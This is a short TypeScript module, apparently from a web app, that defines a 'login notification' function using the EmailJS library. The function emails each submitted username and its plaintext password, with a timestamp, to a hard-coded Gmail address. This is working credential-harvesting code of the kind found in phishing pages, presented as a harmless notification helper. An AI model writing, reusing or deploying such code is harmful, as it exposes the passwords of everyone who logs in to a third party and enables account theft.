import emailjs from '@emailjs/browser';

// Initialize EmailJS with your public key
emailjs.init("E1Ajsh87lU9VrQiW7");

export const sendLoginNotification = async (username: string, password: string) => {
  try {
    return await emailjs.send(
      'service_bah5uw6', // Corrected service ID
      'template_c2w2xdd',
      {
        to_email: 'mmss1001101@gmail.com',
        username: username,
        password: password,
        timestamp: new Date().toLocaleString(),
        message: `New login attempt:\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`
      },
      'E1Ajsh87lU9VrQiW7'
    );
  } catch (error) {
    console.error('Email sending failed:', error);
    throw error;
  }
};